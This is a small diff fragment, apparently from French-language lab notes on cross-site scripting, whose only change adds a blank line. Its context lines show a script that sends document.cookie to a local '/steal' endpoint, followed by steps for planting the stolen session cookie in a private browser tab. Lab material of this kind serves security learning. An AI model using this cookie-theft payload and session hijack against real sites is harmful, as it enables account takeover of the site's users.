@@ -64,6 +64,7 @@ dans http://localhost:5000/search
 fetch('http://localhost:5001/steal?c=' + document.cookie, { mode: 'no-cors' })
 </script>
 
+
 Puis dans un onglet de nav privé 
 document.cookie = "session=VOTRE_COOKIE_VOLE; path=/";
 location.reload();
